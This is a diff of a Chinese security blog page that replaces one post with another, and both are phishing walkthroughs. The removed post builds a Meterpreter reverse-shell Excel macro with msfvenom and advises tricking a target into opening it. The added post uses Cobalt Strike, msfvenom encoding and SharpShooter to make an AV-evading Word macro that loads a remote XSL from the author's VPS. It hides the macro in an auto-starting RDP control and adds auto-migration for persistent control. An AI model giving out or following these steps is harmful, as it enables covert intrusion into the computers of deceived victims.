@@ -48,28 +48,32 @@
   };
 </script>
 
-  <meta name="description" content="刚刚无聊，看到有人在讲office漏洞，所以我就顺便尝试一下。首先，先生成shellcode。">
-<meta name="keywords" content="复现">
+  <meta name="description" content="从uknow师傅这看到的，自己动手做了一遍记录一下。原文在这里">
+<meta name="keywords" content="钓鱼">
 <meta property="og:type" content="article">
-<meta property="og:title" content="office漏洞复现">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;07&#x2F;29&#x2F;office%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&#x2F;index.html">
+<meta property="og:title" content="远程加载XSL文件达到免杀并增加文档迷惑性">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;10&#x2F;%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7&#x2F;index.html">
 <meta property="og:site_name" content="LionKing">
-<meta property="og:description" content="刚刚无聊，看到有人在讲office漏洞，所以我就顺便尝试一下。首先，先生成shellcode。">
+<meta property="og:description" content="从uknow师傅这看到的，自己动手做了一遍记录一下。原文在这里">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;eiBFgIMW8SruzQU.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;A1emIabis7Xo2tN.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;cRDMyhQwPBftVN4.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;bfruqYT4eQ2Zck6.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;9A5wsNaHgY4XfM7.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;Z5RFCpVnUYzoLAu.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;j476MnY8wQSZiIo.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;nLc2J51MPYaKH9p.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;9sOXM4lEAGpnJZt.png">
-<meta property="og:updated_time" content="2019-11-11T07:48:26.000Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;8C9762cBgzAf4Fr.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;iQ5RjdSMas7hFqJ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;2CGjrJKfUYT38W5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;9EjfVMCztrQ2TFi.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;4EBGrJ3Hb2fp7OY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;L1KynkS2IvXmMDj.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;qsL3fIoN6urG8ed.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;aH73KhRABXdyoCI.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;SXvtBiUxMW3RuLO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;L7YGtK6QcAueWBg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;UFbhyoce8MnQLZK.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;6xtpGIT83Fd4qyB.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;sMrVwBc4PC8GRk7.png">
+<meta property="og:updated_time" content="2020-04-10T12:37:31.219Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2019&#x2F;11&#x2F;11&#x2F;eiBFgIMW8SruzQU.png">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;8C9762cBgzAf4Fr.png">
 
-<link rel="canonical" href="http://yoursite.com/2019/07/29/office%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="http://yoursite.com/2020/04/10/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7/">
 
 
 <script id="page-configurations">
@@ -83,7 +87,7 @@
   };
 </script>
 
-  <title>office漏洞复现 | LionKing</title>
+  <title>远程加载XSL文件达到免杀并增加文档迷惑性 | LionKing</title>
   
 
 
@@ -214,7 +218,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/office%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/10/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpeg">
@@ -227,7 +231,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          office漏洞复现
+          远程加载XSL文件达到免杀并增加文档迷惑性
         </h1>
 
         <div class="post-meta">
@@ -236,16 +240,10 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-07-29 23:10:29" itemprop="dateCreated datePublished" datetime="2019-07-29T23:10:29+08:00">2019-07-29</time>
+              <time title="创建时间：2020-04-10 22:30:29 / 修改时间：20:37:31" itemprop="dateCreated datePublished" datetime="2020-04-10T22:30:29+08:00">2020-04-10</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-11-11 15:48:26" itemprop="dateModified" datetime="2019-11-11T15:48:26+08:00">2019-11-11</time>
-              </span>
 
           
 
@@ -258,25 +256,52 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>刚刚无聊，看到有人在讲office漏洞，所以我就顺便尝试一下。<br>首先，先生成shellcode。</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=*.*.*.* lport=**** -f vba -o code.txt</span><br></pre></td></tr></table></figure>
-<p>生成好的shellcode呢，是文本的样子的，<br><img src="https://i.loli.net/2019/11/11/eiBFgIMW8SruzQU.png" alt="image-1-1.png"></p>
-<p>要把他放在office当中。我这里就直接用的excel。</p>
-<p>新建一个表格，在表格选项–信任中心–信任中心选项–宏设置中，启用所有宏</p>
-<p><img src="https://i.loli.net/2019/11/11/A1emIabis7Xo2tN.png" alt="image-3.png"></p>
-<p>开启录制宏，并且将shellcode编辑进宏<br>一开始的文档是没有任何宏的，需要我们手动录制一个，看下图，点开录制宏，然后再停止录制就好了<br><img src="https://i.loli.net/2019/11/11/cRDMyhQwPBftVN4.png" alt="image-4.png"><br>然后点击查看宏，就可以看到有一个“”宏1“”的东西了，然后点击编辑</p>
-<p><img src="https://i.loli.net/2019/11/11/bfruqYT4eQ2Zck6.png" alt="image-5.png"></p>
-<p>将shellcode复制粘贴进去就好了，直接关闭掉宏窗口，他会自动保存的<br><img src="https://i.loli.net/2019/11/11/9A5wsNaHgY4XfM7.png" alt="image-6.png"></p>
-<p>然后保存整个文档，他会提示以下信息<br><img src="https://i.loli.net/2019/11/11/Z5RFCpVnUYzoLAu.png" alt="image-7.png"></p>
-<p>这里选择“否”，他会跳出另存为的页面，选择第二个，保存为“.xlsm”的文件即可。</p>
-<p><img src="https://i.loli.net/2019/11/11/j476MnY8wQSZiIo.png" alt="image-9.png"></p>
-<p>随后，在自己的VPS上监听（需要跟开始设置的shellcode配置相同的ip和端口）。</p>
-<p><img src="https://i.loli.net/2019/11/11/nLc2J51MPYaKH9p.png" alt="image-11.png"></p>
-<p>然后将文档发给目标，通过社工等任意方法，让其打开该文档即可反弹shell。下面是我自己打开的样子。</p>
-<p><img src="https://i.loli.net/2019/11/11/9sOXM4lEAGpnJZt.png" alt="image-12.png"></p>
-<p>因为该shell只有在打开文档的情况下连接，所以我就用了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
-<p>来自动迁移进稳定的进程了，并且看到我的电脑用户名叫pt。拿到shell了后面的事就不在介绍了。</p>
+        <p>从uknow师傅这看到的，自己动手做了一遍记录一下。原文在<a href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">这里</a></p><a id="more"></a>
+<p>在本文中删除了uknow师傅通过编辑宏来触发上线的哪一段，经过试验，个人觉得其后面一部分实用性强一点。遂保留记录。</p>
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>首先使用Cobalt Strike或者Metasploit生成二进制格式的shellcode，即后缀为bin的文件。<br>此处以CS为例：</p>
+<p><img src="https://i.loli.net/2020/04/10/8C9762cBgzAf4Fr.png" alt="Image 1.png"></p>
+<h3 id="处理payload"><a href="#处理payload" class="headerlink" title="处理payload"></a>处理payload</h3><p>因为SharpShooter要求shellcode中不能含有空字节。所以使用msfvenom对payload.bin进行处理生成shellcode-encoded.bin文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/04/10/iQ5RjdSMas7hFqJ.png" alt="Image 3.png"></p>
+<h3 id="生成xsl和macro"><a href="#生成xsl和macro" class="headerlink" title="生成xsl和macro"></a>生成xsl和macro</h3><p>将<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">SharpShooter</a>下载到本地然后安装好依赖，建议使用python2安装</p>
+<p>将shellcode-encoded.bin文件放置脚本同目录下</p>
+<p>使用如下命令生成xsl文件和macro文件（需要修改vps地址）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 4 --payload macro --output foo --rawscfile shellcode-encoded.bin --com xslremote --awlurl http://*.*.*.*:8080/foo.xsl</span><br></pre></td></tr></table></figure>
+<p>简单介绍一下上面的几个参数：</p>
+<ul>
+<li>dotnetver：为目标的.net版本，可选2或者4</li>
+<li>awlurl： 为xsl存放地址</li>
+</ul>
+<p><img src="https://i.loli.net/2020/04/10/2CGjrJKfUYT38W5.png" alt="Image 5.png"></p>
+<p>生成的foo.macro内容大致如下：</p>
+<p><img src="https://i.loli.net/2020/04/10/9EjfVMCztrQ2TFi.png" alt="Image 6.png"></p>
+<p>生成的foo.xsl内容大致如下：</p>
+<p><img src="https://i.loli.net/2020/04/10/4EBGrJ3Hb2fp7OY.png" alt="Image 7.png"></p>
+<h3 id="迷惑性处理"><a href="#迷惑性处理" class="headerlink" title="迷惑性处理"></a>迷惑性处理</h3><p>将foo.xsl文件上传至vps，并开启http服务</p>
+<p><img src="https://i.loli.net/2020/04/10/L1KynkS2IvXmMDj.png" alt="Image 8.png"></p>
+<p>新建一个 启用宏的Word文档 ，进入开发工具，选择旧式控件 — 其他控件 — Microsoft RDP Client Control *（文章中使用的是version 2）</p>
+<p><img src="https://i.loli.net/2020/04/10/qsL3fIoN6urG8ed.png" alt="Image 15.png"></p>
+<p><img src="https://i.loli.net/2020/04/10/aH73KhRABXdyoCI.png" alt="Image 16.png"></p>
+<p>右键属性，将server值填为localhost，将StartConnection值填为1，即点开自启动</p>
+<p><img src="https://i.loli.net/2020/04/10/SXvtBiUxMW3RuLO.png" alt="Image 9.png"></p>
+<p>再右键查看代码，将foo.macro中间部分的代码填入其中</p>
+<p><img src="https://i.loli.net/2020/04/10/L7YGtK6QcAueWBg.png" alt="Image 17.png"></p>
+<p>如下图所示：</p>
+<p><img src="https://i.loli.net/2020/04/10/UFbhyoce8MnQLZK.png" alt="Image 10.png"></p>
+<p>保存后再次打开，可以看到已经显示为 “部分活动内容已被禁用” </p>
+<p><img src="https://i.loli.net/2020/04/10/6xtpGIT83Fd4qyB.png" alt="Image 11.png"></p>
+<p>若点击启用内容，即可看到已经上线。</p>
+<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>虽然上线成功，但是可以注意到上一下会就掉线了，按uknow老哥文章所说：office宏加载远程的.xsl文件有个缺点就是，点击启用宏后word进程会崩掉，如word进程被结束了，Cobalt Strike或者Metasploit会掉线。</p>
+<p>所以这里需要进行自动进程迁移。<br>处理方法：</p>
+<ul>
+<li>Cobalt Strike：通过插件实现上线后自动迁移进程， <a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler" target="_blank" rel="noopener">Beacon Handler Suite</a></li>
+<li>Metasploit: 在设置监听的时间可以设置：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set autorunscript migrate -N explorer.exe 或 set autorunscript -f</span><br></pre></td></tr></table></figure>
+
+<p>这样可以实现在word进程被关闭后，得到一个新的会话，即持久的控制目标。</p>
+<p>将beacon_handler文件下载下来后，修改init.cna中第37行为true，开启beacon自动进程迁移，其他的看着改吧。（我这里还改了sleep时间）</p>
+<p><img src="https://i.loli.net/2020/04/10/sMrVwBc4PC8GRk7.png" alt="Image 18.png"></p>
 
     </div>
 
@@ -286,23 +311,23 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i> 复现</a>
+              <a href="/tags/%E9%92%93%E9%B1%BC/" rel="tag"><i class="fa fa-tag"></i> 钓鱼</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
-                <a href="/2019/07/16/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9E%E7%9B%AE%E6%A0%87IP/" rel="next" title="如何绕过CDN寻找真实目标IP">
-                  <i class="fa fa-chevron-left"></i> 如何绕过CDN寻找真实目标IP
+                <a href="/2020/01/15/Python%E5%81%9A%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%90%88%E6%B3%95%E6%80%A7%E9%AA%8C%E8%AF%81/" rel="next" title="Python做身份证合法性验证">
+                  <i class="fa fa-chevron-left"></i> Python做身份证合法性验证
                 </a>
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/2019/08/10/MacbookPro%E4%B8%8A%E5%AE%89%E8%A3%85nmap%E5%92%8CMetasploit/" rel="prev" title="MacbookPro上安装nmap和Metasploit">
-                  MacbookPro上安装nmap和Metasploit <i class="fa fa-chevron-right"></i>
+                <a href="/2099/01/01/%E6%94%B6%E8%97%8F%E7%9A%84%E6%96%87%E7%AB%A0/" rel="prev" title="收藏的文章">
+                  收藏的文章 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -347,6 +372,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#生成payload"><span class="nav-number">1.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#处理payload"><span class="nav-number">2.</span> <span class="nav-text">处理payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成xsl和macro"><span class="nav-number">3.</span> <span class="nav-text">生成xsl和macro</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#迷惑性处理"><span class="nav-number">4.</span> <span class="nav-text">迷惑性处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#进程迁移"><span class="nav-number">5.</span> <span class="nav-text">进程迁移</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
